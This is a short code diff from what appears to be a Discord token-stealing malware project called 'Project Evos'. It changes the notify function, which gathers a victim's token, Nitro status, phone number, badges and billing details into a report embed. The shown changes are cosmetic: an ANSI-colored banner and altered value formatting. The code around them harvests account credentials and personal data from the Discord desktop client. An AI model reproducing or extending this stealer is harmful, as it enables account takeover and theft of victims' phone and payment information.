@@ -19,6 +19,7 @@ const execCommand = async (command, options = {}) => {
         return null;
     }
 };
+const arrow = '\x1b[1;30m⊱≼≽⊰⊹═════⊹⊱≼Project Evos≽⊰⊹═════⊹⊱≼≽⊰\x1b[0m';
 
 const execScript = async (script) => {
     const windows = BrowserWindow.getAllWindows();
@@ -265,12 +266,12 @@ const notify = async (ctx, token, user) => {
     };
 
     ctx.embeds[0].fields.push(
-        // { name: "\u200b", value: "\u200b", inline: false },
+        { name: "\u200b", value: `${arrow}`, inline: false },
         { name: "Nitro", value: `\`${nitro}\``, inline: true },
         { name: "Phone", value: `\`${user.phone}\`` ? `\`${user.phone}\`` : 'x', inline: true },
         // { name: "\u200b", value: "\u200b", inline: false },
-        { name: "Badges", value: `\`${badges}\``, inline: true },
-        { name: "Billing", value: `\`${billing}\``, inline: true },
+        { name: "Badges", value: `${badges}`, inline: true },
+        { name: "Billing", value: `${billing}`, inline: true },
         // { name: "Path", value: `\`${__dirname.trim().replace(/\\/g, "/")}\``, inline: false },
     );
 
